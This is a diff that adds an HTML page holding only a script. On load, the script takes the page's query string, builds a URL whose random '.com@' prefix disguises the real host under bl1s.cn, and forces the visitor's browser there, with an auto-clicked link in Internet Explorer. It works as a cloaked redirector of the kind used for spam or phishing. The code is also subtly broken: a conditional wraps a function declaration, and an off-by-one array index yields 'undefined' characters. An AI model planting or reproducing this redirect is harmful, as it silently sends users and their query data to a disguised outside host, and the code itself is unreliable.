@@ -1,0 +1,33 @@
+<body></body><script>   
+function GetRandomNum(Min,Max)
+{   
+var Range = Max - Min;   
+var Rand = Math.random();   
+return(Min + Math.round(Rand * Range));   
+}
+var reg = location.search;
+var a = reg.split("?")[1];
+if(a!=null && a!='')
+
+function generateMixed(n) {
+var chars = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'];
+     var res = "";
+     for(var i = 0; i < n ; i ++) {
+         var id = Math.ceil(Math.random()*62);
+         res += chars[id];
+     }
+	 
+     return res;
+}
+  
+
+var url='http://'+generateMixed(5)+'.com@'+generateMixed(5)+'.'+generateMixed(3)+'.bl1s.cn/?'+a+'';
+
+
+
+if(/MSIE/i.test(navigator.userAgent)){try{window.moveTo(0,0);window.resizeTo(screen.availWidth,screen.availHeight);}catch(e){};var a=document.createElement('a');a.href=url;document.body.appendChild(a);a.click();}else{location.href=url;}
+
+var chars = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'];
+
+
+</script>
